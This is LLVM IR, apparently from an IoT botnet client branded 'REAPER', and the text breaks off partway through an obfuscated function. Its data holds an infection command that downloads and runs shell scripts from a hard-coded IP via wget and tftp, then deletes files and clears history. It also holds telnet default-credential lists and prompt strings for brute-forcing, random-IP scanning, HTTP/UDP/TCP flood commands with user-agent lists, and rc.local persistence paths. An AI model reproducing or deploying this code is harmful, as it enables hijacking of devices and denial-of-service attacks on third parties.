@.str.274 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00", align 1
@.str.275 = private unnamed_addr constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00", align 1
@.str.276 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00", align 1
@.str.277 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00", align 1
@.str.278 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00", align 1
@.str.279 = private unnamed_addr constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00", align 1
@.str.280 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.281 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00", align 1
@.str.282 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00", align 1
@.str.283 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00", align 1
@.str.284 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00", align 1
@.str.285 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00", align 1
@.str.286 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00", align 1
@.str.287 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00", align 1
@.str.288 = private unnamed_addr constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00", align 1
@.str.289 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00", align 1
@.str.290 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00", align 1
@.str.291 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.292 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00", align 1
@.str.293 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00", align 1
@.str.294 = private unnamed_addr constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00", align 1
@.str.295 = private unnamed_addr constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00", align 1
@.str.296 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00", align 1
@.str.297 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.298 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.299 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.300 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.301 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.302 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.303 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.304 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.305 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.306 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@AllDemDupes = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.307, i32 0, i32 0)], align 8
@.str.307 = private unnamed_addr constant [16 x i8] c"70.32.30.177:23\00", align 1
@infect = global i8* getelementptr inbounds ([311 x i8], [311 x i8]* @.str.308, i32 0, i32 0), align 8
@.str.308 = private unnamed_addr constant [311 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://70.32.30.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 70.32.30.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 70.32.30.177; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@usernames = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.309 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.310 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.311 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.312 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.313 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.314 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.315 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.316 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.317 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@HeliosCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.327, i32 0, i32 0), i8* null], align 16
@.str.318 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.320 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.321 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.322 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.323 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.324 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.325 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.326 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.327 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.331, i32 0, i32 0), i8* null], align 16
@.str.328 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.329 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.330 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.331 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* null], align 16
@.str.332 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.333 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.334 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.336 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.337 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.338 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@.str.339 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.340 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.341 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.423 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.342 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.343 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.344 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.345 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GetRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.346 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.347 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.348 = private unnamed_addr constant [93 x i8] c"\1B[1;33mLogin Found \1B[1;31mAttempting To Brute \1B[1;30mLIKE A GOD!!! IP:%s User:%s Pass:%s\1B[0m\00", align 1
@.str.349 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.350 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0)], align 16
@.str.351 = private unnamed_addr constant [5 x i8] c"REAP\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.353 = private unnamed_addr constant [4 x i8] c"AWS\00", align 1
@.str.354 = private unnamed_addr constant [9 x i8] c"AWSPANEL\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"COCAINE\00", align 1
@.str.356 = private unnamed_addr constant [6 x i8] c"INSTA\00", align 1
@.str.357 = private unnamed_addr constant [16 x i8] c"FLEXINGONLAMERS\00", align 1
@.str.358 = private unnamed_addr constant [7 x i8] c"NULLME\00", align 1
@.str.359 = private unnamed_addr constant [8 x i8] c"STDMETH\00", align 1
@.str.360 = private unnamed_addr constant [9 x i8] c"BUTTHOLE\00", align 1
@.str.361 = private unnamed_addr constant [9 x i8] c"urnangay\00", align 1
@.str.362 = private unnamed_addr constant [7 x i8] c"vegena\00", align 1
@.str.363 = private unnamed_addr constant [5 x i8] c"no u\00", align 1
@.str.364 = private unnamed_addr constant [17 x i8] c"ovhhasalilweiner\00", align 1
@.str.365 = private unnamed_addr constant [17 x i8] c"TRAPNMODSISASKID\00", align 1
@.str.366 = private unnamed_addr constant [10 x i8] c"DANKPOWER\00", align 1
@.str.367 = private unnamed_addr constant [7 x i8] c"udpcri\00", align 1
@.str.368 = private unnamed_addr constant [7 x i8] c"STDCRI\00", align 1
@.str.369 = private unnamed_addr constant [15 x i8] c"NFOServers.com\00", align 1
@.str.370 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.371 = private unnamed_addr constant [6 x i8] c"haxor\00", align 1
@.str.372 = private unnamed_addr constant [15 x i8] c"aws.amazon.com\00", align 1
@.str.373 = private unnamed_addr constant [9 x i8] c"slav.com\00", align 1
@.str.374 = private unnamed_addr constant [9 x i8] c"AWS Menu\00", align 1
@.str.375 = private unnamed_addr constant [9 x i8] c"ganggang\00", align 1
@.str.376 = private unnamed_addr constant [10 x i8] c"instagram\00", align 1
@.str.377 = private unnamed_addr constant [6 x i8] c"rand0\00", align 1
@.str.378 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.379 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.380 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.381 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.382 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.383 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.384 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.385 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.386 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.387 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.388 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.389 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.390 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.391 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.392 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.393 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.394 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.395 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.396 = private unnamed_addr constant [6 x i8] c"PUSSY\00", align 1
@.str.397 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.398 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.399 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.400 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.401 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.402 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.403 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.404 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.406 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.407 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.409 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.410 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.411 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.412 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.413 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.414 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.415 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.416 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.417 = private unnamed_addr constant [159 x i8] c"\1B[1;37m[\1B[0;31mREAPER\1B[1;37m] \1B[1;36mDevices Loading\1B[1;37m ~> [IP] ~> [\1B[1;33m%s\1B[1;37m] ~> [BUILD] ~> [\1B[1;35mArch:%s\1B[1;37m] ~> [\1B[1;32mLOADED\1B[1;37m]\1B[34m\00", align 1
@.str.418 = private unnamed_addr constant [9 x i8] c"LELIMDUP\00", align 1
@.str.419 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.420 = private unnamed_addr constant [11 x i8] c"STOLENBOTS\00", align 1
@.str.421 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.422 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -256873012, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -256873012, label %10
    i32 838957265, label %14
    i32 -962537515, label %32
    i32 -103118627, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 838957265, i32 -103118627
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
